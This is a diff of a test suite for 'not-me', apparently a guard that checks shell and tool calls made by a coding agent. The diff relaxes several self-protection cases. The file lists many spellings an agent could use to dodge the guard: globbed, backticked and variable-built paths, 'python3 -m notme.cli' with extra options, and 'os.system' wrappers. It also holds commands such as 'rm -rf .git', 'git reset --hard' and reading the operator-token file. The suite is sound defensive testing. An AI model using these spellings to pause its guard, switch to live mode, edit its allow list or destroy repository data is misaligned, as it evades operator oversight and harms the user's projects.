+    bash(A, None, "notme allow-repo add acme/other", _where)
+    bash(A, None, "notme pause off", _where)
+    bash(A, None, 'script -q -c "notme pause off" /dev/null', _where)
     bash(A, None, "cd {F}/app && notme status", _where)  # re-points the CLI at a not-me project
     bash(A, None, "notme git worktree-add 0123456789abcdef", _where)
-    # a command name taken from a variable cannot be checked: it blocks when it could drive notme
-    bash(B, SP, "N=notme; $N pause off", _where)
-    bash(B, SP, '"$CLAUDE_PLUGIN_ROOT/bin/notme" pause off', _where)
+    bash(A, None, "N=notme; $N pause off", _where)
     bash(A, None, "$CLAUDE_PLUGIN_ROOT/bin/notme --project-dir /x status", _where)
-    bash(B, SP, "NOT_ME_HOME=/x $P/bin/notme pause off", _where)
     bash(A, None, "echo $HOME", _where)
     bash(A, None, "ls $TMPDIR", _where)
     bash(A, None, "git push origin $BRANCH", _where)
@@ -935,23 +861,15 @@ for _where in ("nogit", "app/vendor/nested"):
     write(A, None, "Edit", ".git/config", _where)
     mcp(A, None, "Grep", {"pattern": "x"}, _where)
     mcp(A, None, "mcp__github__create_issue", {"owner": "acme", "repo": "other"}, _where)
-    # the live-mode epoch and marker, and going live, are self-protection too
-    write(B, SP, "Read", "{H}/mode-live.epoch", _where)
-    bash(B, SP, "cat {H}/mode-live.e*", _where)
-    write(B, SP, "Write", "{H}/mode-live.sig", _where)
-    bash(B, SP, "cp /tmp/saved {H}/mode-live.sig", _where)
-    bash(B, SP, "notme mode live", _where)
-    bash(B, SP, '"$CLAUDE_PLUGIN_ROOT/bin/notme" mode live', _where)
+    # going live is the operator's /not-me:mode live; a Write of a live global project.md still blocks
+    bash(A, None, "notme mode live", _where)
     mcp(B, SP, "Write", {"file_path": "{H}/project.md", "content": "---\nschema: 1\nmode: live\n---\n"}, _where)
-    bash(B, SP, "$P mode live", _where)
-    bash(B, SP, "X=$(printf %s no tme); $X mode live", _where)
     bash(A, None, "notme mode show", _where)
-    bash(A, None, "$P mode show", _where)
     bash(A, None, "$EDITOR mode.txt", _where)
 
-# Live mode is signed: `mode: live` counts only next to the marker `notme mode live` writes with the operator
-# token, so no file write by the agent can turn it on. The guard keeps a friendly early refusal for Edit/Write of a
-# live global project.md, protects the marker itself, and blocks `notme mode live` in every spelling.
+# `mode: live` in the global layer is enough (#118). The operator goes live with /not-me:mode live, which runs
+# `notme mode live` in the session and logs the change; a Write or Edit of the global project.md that would leave it
+# anything but dry-run is refused, so the change goes through that command.
 LIVE_FRONT = "---\nschema: 1\nmode: live\n---\n# Project\n"
 DRY_FRONT = "---\nschema: 1\nmode: dry-run\n---\n# Project\n"
 
@@ -980,84 +898,36 @@ edit(A, None, "Edit", {"file_path": "{H}/project.md", "old_string": "mode: dry-r
                        "new_string": "mode: dry-run\nenabled: false"})
 edit(A, None, "Edit", {"file_path": "{H}/project.md", "old_string": "# Project", "new_string": "mode: live"})
 edit(A, None, "Write", {"file_path": "{F}/gdry/.claude/not-me/project.md", "content": LIVE_FRONT})
-# A shell write of the global project.md is no longer the guard's business: a hand-set live runs as dry-run.
+# A shell write of the global project.md is not the guard's business.
 bash(A, None, "echo 'mode: live' >> {H}/project.md", "gdry")
 bash(A, None, "cat {H}/project.md", "gdry")
-bash(B, SP, "notme mode live")
-_mode_cli_id = CASES[-1][0]
-bash(B, SP, "{P}/bin/notme mode live")
-bash(B, SP, "bash {P}/bin/notme mode live")
-bash(B, SP, "python3 {P}/cli/notme.py mode live")
-bash(B, SP, "notme --dry-run mode live", "alloff")
-bash(B, SP, "notme mode 'li've'")
-bash(B, SP, "notme mode live", "running")
-bash(B, SP, "{P}/bin/notme mode live", "running")
-bash(B, SP, "python3 {P}/cli/notme.py mode live", "running")
-bash(A, None, "notme mode show")
-bash(A, None, "{P}/bin/notme mode dry-run")
+# `notme mode live` is the operator's /not-me:mode live, in every spelling and in or out of a run.
+bash(A, None, "notme mode live")
+bash(A, None, "{P}/bin/notme mode live", "running")
+bash(A, None, "python3 -m notme.cli mode live")
+bash(A, None, "python3 -W ignore -m notme.cli pause off", "running")
+bash(A, None, "python3 -m notme.cli allow-repo remove acme/x")
 bash(A, None, "notme mode dry-run --global")
-bash(A, None, "python3 {P}/cli/notme.py mode show", "running")
-bash(A, None, "notme mode dry-run", "running")
-# `python -m notme.cli` and `python -m notme` are notme calls too, for mode, pause and the allow list alike.
-bash(B, SP, "python3 -m notme.cli mode live")
-bash(B, SP, "python3 -mnotme.cli mode live")
-bash(B, SP, "python3 -m notme mode live", "running")
-bash(B, SP, "python3 -m notme.cli pause off")
-bash(B, SP, "python -m notme pause off", "running")
-bash(B, SP, "python3 -m notme.cli allow-repo remove acme/x")
-bash(A, None, "python3 -m notme.cli mode show")
-bash(A, None, "python3 -m notme.cli pause on")
 bash(A, None, "python3 -m json.tool x.json")
-# The marker is the operator's signature: the agent may not write, copy over or delete it, in or out of a run.
-edit(B, SP, "Write", {"file_path": "{H}/mode-live.sig", "content": "0" * 64}, "app")
-_marker_id = CASES[-1][0]
-edit(B, SP, "Write", {"file_path": "{H}/mode-live.sig", "content": "0" * 64}, "running")
-edit(B, SP, "Edit", {"file_path": "{H}/MODE-LIVE.SIG", "old_string": "a", "new_string": "b"}, "app")
-edit(B, SP, "Write", {"file_path": "{F}/elsewhere/mode-live.sig", "content": "x"}, "app")
-bash(B, SP, "cp /tmp/saved {H}/mode-live.sig")
-bash(B, SP, "cp /tmp/saved {H}/mode-live.sig", "running")
-bash(B, SP, "echo 0 > {H}/mode-l\\ive.sig")
-bash(A, None, "cd {H} && mv x mode-live.sig")
-# ... also through globs, redirections and parts the guard cannot resolve, matched against the marker's path (it
-# need not exist yet). The Read tool may still read it.
+# Leftover files of the signed live marker are ordinary files now.
+edit(A, None, "Write", {"file_path": "{H}/mode-live.sig", "content": "0" * 64}, "app")
+bash(A, None, "cat {H}/mode-live.epoch")
+# The allow list through globs, redirections and parts the guard cannot resolve, matched against its path (it need
+# not exist yet), in or out of a run.
 for _variant in ("app", "running"):
-    bash(B, SP, "cp /tmp/saved {H}/mode-live.s*", _variant)
-    bash(B, SP, "cp /tmp/saved {H}/mode-l?ve.sig", _variant)
-    bash(B, SP, "cp /tmp/saved {H}/mode-live.$EXT", _variant)
-    bash(B, SP, "mv x {H}/mode-live.{sig,bak}", _variant)
-    bash(B, SP, "cp /tmp/saved {H}/mode-live.s`echo ig`", _variant)
-    bash(B, SP, "echo 0 > {H}/m*.sig", _variant)
-    bash(B, SP, "printf 0 2>{H}/mode-live.s?g", _variant)
-    bash(B, SP, "tee {H}/mode-live.s* < x", _variant)
-    bash(B, SP, "dd if=x of={H}/mode-l*", _variant)
-    bash(B, SP, "cp /tmp/saved ${NOT_ME_HOME:-x}/mode-live.s[i]g", _variant)
-    write(A, None, "Read", "{H}/mode-live.sig", _variant)
-# The epoch keys the marker with the token and is replaced on every return to dry-run, so a saved marker cannot be
-# replayed. Like the token, the agent may neither read nor write it, in any spelling, in or out of a run.
-for _variant in ("app", "running"):
-    write(B, SP, "Read", "{H}/mode-live.epoch", _variant)
-    write(B, SP, "Write", "{H}/mode-live.epoch", _variant)
-    write(B, SP, "Edit", "{F}/app/MODE-LIVE.EPOCH", _variant)
-    mcp(B, SP, "NotebookRead", {"notebook_path": "{H}/mode-live.epoch"}, _variant)
-    bash(B, SP, "cat {H}/mode-live.epoch", _variant)
-    bash(B, SP, "cat {H}/mode-live.e*", _variant)
-    bash(B, SP, "cp {H}/mode-*.epoch /tmp/x", _variant)
-    bash(B, SP, "cp /tmp/old {H}/mode-live.e?och", _variant)
-    bash(B, SP, "head {H}/../*/mode-live.e*", _variant)
-    bash(A, None, "cd {H} && base64 mode-live.e*", _variant)
-    bash(B, SP, "cat {H}/mode-live.e$X", _variant)
-    bash(B, SP, "cat {H}/mode-live.{epoch,x}", _variant)
-    bash(B, SP, "cat {H}/mode-live.e`echo poch`", _variant)
-    bash(B, SP, "cat {H}/mode-live.e$(echo poch)", _variant)
-    bash(B, SP, "cat $NOT_ME_HOME/mode-live.e*", _variant)
-    bash(B, SP, "xxd ${NOT_ME_HOME:-/x}/*.epoch", _variant)
+    bash(B, SP, "cp /tmp/saved {H}/allowed-repos.j*", _variant)
+    bash(B, SP, "cp /tmp/saved {H}/allowed-repos.$EXT", _variant)
+    bash(B, SP, "mv x {H}/allowed-repos.{json,bak}", _variant)
+    bash(B, SP, "cp /tmp/saved {H}/allowed-repos.js`echo on`", _variant)
+    bash(B, SP, "printf 0 2>{H}/allowed-repos.js?n", _variant)
+    bash(B, SP, "tee {H}/allowed-r* < x", _variant)
+    bash(B, SP, "dd if=x of={H}/allowed-*", _variant)
+    bash(B, SP, "cp /tmp/saved ${NOT_ME_HOME:-x}/allowed-repos.[j]son", _variant)
+    bash(B, SP, "cat $NOT_ME_HOME/allowed-*", _variant)
     bash(B, SP, "cat {H}/$NAME", _variant)
-    bash(B, SP, "echo 0 > {H}/mode-live.e*", _variant)
-    bash(B, SP, "python3 -c \"print(open('{H}/mode-live.epoch').read())\"", _variant)
-    mcp(B, SP, "Grep", {"pattern": "x", "path": "{H}/..", "glob": "mode-live.e*"}, _variant)
-    mcp(B, SP, "Glob", {"pattern": "{H}/../*/mode-live.e*"}, _variant)
-    mcp(B, SP, "Glob", {"pattern": "{H}/mode-live.e?och"}, _variant)
-_epoch_id = next(c[0] for c in CASES if c[3] == "Read" and c[4]["file_path"].endswith("mode-live.epoch"))
+    bash(B, SP, "echo 0 > {H}/allowed-repos.json", _variant)
+    bash(A, None, "cd {H} && base64 allowed-*", _variant)
+    write(A, None, "Read", "{H}/allowed-repos.json", _variant)
 # Arguments the guard cannot place anywhere near the not-me home stay allowed.
 bash(A, None, "cat $FILE")
 bash(A, None, "cp $SRC $DST")
@@ -1067,21 +937,11 @@ bash(A, None, "echo hi > out.txt")
 bash(A, None, "make 2>&1 | tee log.txt")
 bash(A, None, "awk '{print $1}' README.md")
 bash(A, None, "cat README.md > {F}/app/copy.md")
-# Python options that take a value (-W, -X, joined or not) do not hide `-m notme.cli` or the CLI script.
-bash(B, SP, "python3 -W ignore -m notme.cli mode live")
-bash(B, SP, "python3 -Wignore -m notme.cli mode live")
-bash(B, SP, "python3 -X utf8 -m notme.cli mode live", "running")
-bash(B, SP, "python3 -Xutf8 -m notme mode live")
-bash(B, SP, "python3 -bW ignore -m notme.cli mode live")
-bash(B, SP, "python3 -Bm notme.cli mode live")
-bash(B, SP, "python3 -W ignore {P}/cli/notme.py mode live")
-bash(B, SP, "python3 -W ignore -m notme.cli pause off")
-bash(B, SP, "python3 -X utf8 -m notme.cli pause off", "running")
-bash(B, SP, "python3 -W ignore -X utf8 -m notme.cli allow-repo remove acme/x")
-bash(B, SP, "python3 -Xutf8 -m notme.cli allow-repo remove acme/x", "running")
+# Python options that take a value (-W, -X, joined or not) before `-m notme.cli` or the CLI script.
+bash(A, None, "python3 -Xutf8 -m notme mode live")
+bash(A, None, "python3 -Bm notme.cli mode live")
+bash(A, None, "python3 -W ignore {P}/cli/notme.py mode live")
 bash(A, None, "python3 -W ignore -m notme.cli mode show")
-bash(A, None, "python3 -X utf8 -m notme.cli mode show", "running")
-bash(A, None, "python3 -Wignore -Xutf8 -m notme.cli pause on")
 bash(A, None, "python3 -W ignore -m json.tool x.json")
 # Quoted keys are keys to the frontmatter parser: the guard parses the result instead of matching a line.
 for _quoted in ('"mode": live', "'mode': live"):
@@ -1230,9 +1090,9 @@ for cmd in (
         "cd {F}/other; xargs cd {F}/app </dev/null; git push",
 ):
     bash(B, PB, cmd)
-bash(B, SP, "cd {F}/other; cd {F}/app & git push")  # a background job after a cd
-bash(B, SP, "cd {F}/other; if true; then cd {F}/app; fi & git push")
-bash(B, SP, "cd {F}/other; nohup cd {F}/app; git push")
+bash(A, None, "cd {F}/other; cd {F}/app & git push")  # the guard does not follow cd (docs/guards.md)
+bash(A, None, "cd {F}/other; if true; then cd {F}/app; fi & git push")
+bash(A, None, "cd {F}/other; nohup cd {F}/app; git push")
 bash(A, None, 'cd "$NOWHERE" && cat o*')  # after a cd, a relative glob that can name the token
 # a directory change next to a git or gh write: the write is judged where the session runs (an alias that pushes
 # elsewhere still blocks)
@@ -1796,7 +1656,7 @@ for tool, tin in (("mcp__ccd_session_mgmt__send_message", {"session_id": "x", "m
                   ("mcp__terminal__run_in_terminal", {"command": "claude --resume abc -p hi"}),
                   ("mcp__terminal__run_in_terminal", {"command": "git push https://github.com/acme/other HEAD"}),
                   ("mcp__terminal__run_in_terminal", {"command": "notme pause off"}),
-                  ("mcp__terminal__run_in_terminal", {"command": "cat ~/.claude/not-me/operator-token"}),
+                  ("mcp__terminal__run_in_terminal", {"command": "cat ~/.claude/not-me/allowed-repos.json"}),
                   ("mcp__x__y", {"text": "it's not closed"}),
                   ("mcp__x__y", {"code": "(() => { return [1, 2].map(x => x * 2) })()"}),
                   ("mcp__ccd_turn__wrap_up", {"recap": "Run git push origin main, then gh pr merge 5 -R acme/app."}),
@@ -1875,19 +1735,19 @@ for cmd in ("gh secret set TOKEN --repo acme/app --body x", "gh variable set X -
 bash(A, None, "gh ruleset view 1 --repo acme/app")  # a read
 for cmd in ("git branch -D feature/old", "git clean -fd", "rm -rf node_modules build", "git reset --hard HEAD~1"):
     bash(A, None, cmd)
-# self-protection, in every directory
+# self-protection, in every directory: the allow list file and the plugin's own files. The not-me CLI is the
+# operator's (#118): the allow list, the pause and the mode change through it.
 for variant in ("app", "nogit"):
-    write(B, SP, "Read", "{H}/operator-token", variant)
     write(B, SP, "Write", "{H}/allowed-repos.json", variant)
-    write(B, SP, "Write", "{H}/mode-live.sig", variant)
-    write(B, SP, "Read", "{H}/mode-live.epoch", variant)
-    for cmd in ("notme mode live", "python3 -m notme.cli mode live", "{P}/bin/notme mode on",
-                "notme allow-repo add acme/other", "notme pause off", 'script -q -c "notme pause off" /dev/null',
-                "nohup notme pause off &", "cat {H}/operator-token", "cat ~/.claude/not-me/operator-token",
-                "cp /tmp/x {H}/mode-live.sig", "echo {{}} > {H}/allowed-repos.json",
-                "bash -c 'notme allow-repo add acme/other'", "N=notme; $N pause off"):
+    write(B, SP, "Write", "{P}/notme/guard.py", variant)
+    write(A, None, "Read", "{H}/allowed-repos.json", variant)
+    for cmd in ("cat {H}/allowed-repos.json", "cat ~/.claude/not-me/allowed-repos.json",
+                "echo {{}} > {H}/allowed-repos.json"):
         bash(B, SP, cmd, variant)
-    for cmd in ("notme mode show", "notme mode dry-run", "notme pause on", "notme allow-repo list", "notme status"):
+    for cmd in ("notme mode live", "python3 -m notme.cli mode live", "notme allow-repo add acme/other",
+                "notme pause off", 'script -q -c "notme pause off" /dev/null', "nohup notme pause off &",
+                "bash -c 'notme allow-repo add acme/other'", "N=notme; $N pause off", "notme mode show",
+                "notme mode dry-run", "notme pause on", "notme allow-repo list", "notme status"):
         bash(A, None, cmd, variant)
 # opaque text: parsed where it can be, else blocked only for the words that matter, under the first rule that is on
 _OPAQUE_ID = f"G{len(CASES) + 1:03d}"
@@ -2039,10 +1899,10 @@ bash(G, OR, 'gh api graphql -f query="mutation { addComment(input:{body:\\"delet
 # text the guard cannot parse that names no git, gh or notme command: a keyword in it is guided, not blocked
 bash(G, PROC, "python3 - notes.py <<'EOF'\ns = open('notes.py').read().replace('push', 'send')\nEOF")
 bash(G, PROC, "python3 -c 'print(\"reset --hard and branch -D are words here\")'")
-bash(G, PROC, "node -e 'console.log(\"mode live\")'")
+bash(A, None, "node -e 'console.log(\"mode live\")'")
 bash(B, PB, "python3 -c 'import subprocess; subprocess.run([\"git\", \"push\"])'")  # names git: still blocked
 bash(B, DG, "python3 -c 'import os; os.system(\"rm -rf .git\")'")  # rm needs no git word
-bash(B, SP, "python3 -c 'import os; os.system(\"notme mode live\")'")
+bash(A, None, "python3 -c 'import os; os.system(\"notme mode live\")'")
 bash(B, PB, 'gh api graphql -f query="mutation { updateRefs(input:{}) { clientMutationId } }"')
 bash(B, PB, 'gh api graphql -f query="mutation { createCommitOnBranch(input:{}) { commit { oid } } }"')
 bash(B, PB, "gh api -X PATCH repos/acme/other/git/refs/heads/main -f sha=abc")
@@ -2144,10 +2004,7 @@ ROUND_B_END = len(CASES)
 
 # Substrings a block message must contain, by case id. Guided cases print no message; test_guard checks their rule.
 MESSAGE_CHECKS: Dict[str, List[str]] = {
-    _mode_edit_id: ["/not-me:mode live"],
-    _mode_cli_id: ["/not-me:mode live"],
-    _marker_id: ["live-mode marker", "/not-me:mode live"],
-    _epoch_id: ["live-mode epoch", "/not-me:mode live"],
+    _mode_edit_id: ["changes only through /not-me:mode", "run /not-me:mode"],
     _OPAQUE_ID: ["python3 runs code the guard does not parse", "holds `push`", "not-me guard [protected_branches]"],
     _VAR_C_ID: ["not-me guard [protected_branches]", "Why: the guard does not expand shell variables in a `git -C` path",
                 "Instead: write the path out in full (`git -C /abs/path <sub> ...`); a rewritten command is "
